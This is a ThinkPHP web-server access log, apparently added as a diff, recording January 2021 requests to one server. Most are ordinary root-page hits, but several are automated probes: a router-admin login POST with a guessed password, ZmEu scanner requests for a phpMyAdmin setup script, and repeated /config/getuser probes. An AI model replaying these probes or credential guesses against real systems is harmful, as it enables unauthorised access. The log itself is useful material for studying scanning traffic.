@@ -1,0 +1,2570 @@
+---------------------------------------------------------------
+[ 2021-01-18T01:25:28+08:00 ] 151.235.243.120 GET 101.37.13.45:80/
+[运行时间：0.017859s] [吞吐率：55.99req/s] [内存消耗：1,760.32kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T02:41:47+08:00 ] 198.20.124.218 GET 101.37.13.45/
+[运行时间：0.015638s] [吞吐率：63.95req/s] [内存消耗：1,760.65kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T02:50:40+08:00 ] 194.79.60.136 GET 101.37.13.45:80/
+[运行时间：0.016836s] [吞吐率：59.40req/s] [内存消耗：1,760.32kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T03:04:48+08:00 ] 36.68.11.126 GET 101.37.13.45:80/
+[运行时间：0.021836s] [吞吐率：45.80req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T03:04:56+08:00 ] 63.209.154.221 GET 101.37.13.45:80/
+[运行时间：0.015352s] [吞吐率：65.14req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T03:30:03+08:00 ] 198.98.48.77 POST 101.37.13.45:80/boaform/admin/formLogin
+[运行时间：0.018175s] [吞吐率：55.02req/s] [内存消耗：1,835.67kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'boaform',
+    1 => 'admin',
+    2 => 'formLogin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'en-GB,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'origin' => 'http://101.37.13.45:80',
+  'connection' => 'keep-alive',
+  'referer' => 'http://101.37.13.45:80/admin/login.asp',
+  'upgrade-insecure-requests' => '1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '29',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'admin',
+  'psd' => 'Feefifofum',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T03:33:27+08:00 ] 197.39.8.132 GET 101.37.13.45:80/
+[运行时间：0.015610s] [吞吐率：64.06req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T03:45:06+08:00 ] 168.232.13.66 GET 101.37.13.45:80/
+[运行时间：0.018018s] [吞吐率：55.50req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T04:16:27+08:00 ] 209.141.58.184 GET 101.37.13.45/w00tw00t.at.blackhats.romanian.anti-sec:)
+[运行时间：0.022483s] [吞吐率：44.48req/s] [内存消耗：1,833.89kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'w00tw00t.at.blackhats.romanian.anti-sec:)',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'accept' => '*/*',
+  'accept-language' => 'en-us',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'ZmEu',
+  'host' => '101.37.13.45',
+  'connection' => 'Close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T04:16:27+08:00 ] 209.141.58.184 GET 101.37.13.45/phpMyAdmin/scripts/setup.php
+[运行时间：0.017365s] [吞吐率：57.59req/s] [内存消耗：1,834.29kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpMyAdmin',
+    1 => 'scripts',
+    2 => 'setup.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'accept' => '*/*',
+  'accept-language' => 'en-us',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'ZmEu',
+  'host' => '101.37.13.45',
+  'connection' => 'Close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T06:19:32+08:00 ] 159.89.10.16 GET 101.37.13.45/
+[运行时间：0.014968s] [吞吐率：66.81req/s] [内存消耗：1,760.63kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T06:31:05+08:00 ] 121.58.52.31 GET 101.37.13.45/
+[运行时间：0.014679s] [吞吐率：68.12req/s] [内存消耗：1,759.89kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T07:34:55+08:00 ] 14.102.76.74 GET 101.37.13.45:80/
+[运行时间：0.015562s] [吞吐率：64.26req/s] [内存消耗：1,760.32kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T07:42:38+08:00 ] 206.189.222.96 POST 101.37.13.45/
+[运行时间：0.017165s] [吞吐率：58.26req/s] [内存消耗：1,762.08kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
+  'accept-encoding' => 'gzip',
+  'cookie' => 'id=4616422223528103',
+  'host' => '101.37.13.45',
+  'connection' => 'close',
+  'content-length' => '1044',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T07:54:15+08:00 ] 45.83.67.19 GET 101.37.13.45/
+[运行时间：0.017840s] [吞吐率：56.05req/s] [内存消耗：1,761.29kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
+  'accept' => '*/*',
+  'accept-language' => 'en;q=0.7,en-US;q=0.3',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'pragma' => 'no-cache',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T08:41:12+08:00 ] 45.14.224.26 GET 101.37.13.45:80/config/getuser?index=0
+[运行时间：0.017761s] [吞吐率：56.30req/s] [内存消耗：1,835.23kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'config',
+    1 => 'getuser',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-GB,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  'index' => '0',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T09:42:42+08:00 ] 106.14.201.93 GET 101.37.13.45/
+[运行时间：0.016006s] [吞吐率：62.48req/s] [内存消耗：1,760.32kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 chrome(windows nt/Windows NT;)Chrome',
+  'host' => '101.37.13.45',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T10:15:21+08:00 ] 51.254.59.113 GET 101.37.13.45/
+[运行时间：0.015198s] [吞吐率：65.80req/s] [内存消耗：1,760.24kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
+  'connection' => 'close',
+  'host' => '101.37.13.45',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T10:23:10+08:00 ] 209.141.58.184 GET 101.37.13.45/w00tw00t.at.blackhats.romanian.anti-sec:)
+[运行时间：0.017907s] [吞吐率：55.84req/s] [内存消耗：1,833.89kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'w00tw00t.at.blackhats.romanian.anti-sec:)',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'accept' => '*/*',
+  'accept-language' => 'en-us',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'ZmEu',
+  'host' => '101.37.13.45',
+  'connection' => 'Close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T10:23:10+08:00 ] 209.141.58.184 GET 101.37.13.45/phpMyAdmin/scripts/setup.php
+[运行时间：0.019422s] [吞吐率：51.49req/s] [内存消耗：1,834.29kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpMyAdmin',
+    1 => 'scripts',
+    2 => 'setup.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'accept' => '*/*',
+  'accept-language' => 'en-us',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'ZmEu',
+  'host' => '101.37.13.45',
+  'connection' => 'Close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T12:10:12+08:00 ] 178.130.190.158 GET 101.37.13.45:80/
+[运行时间：0.060884s] [吞吐率：16.42req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T12:10:12+08:00 ] 178.130.190.158 GET 101.37.13.45:80/
+[运行时间：0.043691s] [吞吐率：22.89req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T12:10:12+08:00 ] 178.130.190.158 GET 101.37.13.45:80/
+[运行时间：0.049322s] [吞吐率：20.27req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T12:10:12+08:00 ] 178.130.190.158 GET 101.37.13.45:80/
+[运行时间：0.032821s] [吞吐率：30.47req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T12:10:13+08:00 ] 178.130.190.158 GET 101.37.13.45:80/
+[运行时间：0.016368s] [吞吐率：61.09req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T12:10:15+08:00 ] 178.130.190.158 GET 101.37.13.45:80/
+[运行时间：0.014960s] [吞吐率：66.84req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T13:14:58+08:00 ] 187.57.182.94 GET 101.37.13.45:80/
+[运行时间：0.030147s] [吞吐率：33.17req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T13:14:58+08:00 ] 187.57.182.94 GET 101.37.13.45:80/
+[运行时间：0.017470s] [吞吐率：57.24req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T13:17:19+08:00 ] 175.143.7.113 GET 101.37.13.45:80/
+[运行时间：0.015437s] [吞吐率：64.78req/s] [内存消耗：1,760.32kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T13:36:58+08:00 ] 189.112.16.6 GET 101.37.13.45:80/
+[运行时间：0.014655s] [吞吐率：68.24req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T14:25:28+08:00 ] 139.162.227.206 GET 101.37.13.45:80/config/getuser?index=0
+[运行时间：0.017060s] [吞吐率：58.62req/s] [内存消耗：1,835.23kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'config',
+    1 => 'getuser',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-GB,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  'index' => '0',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
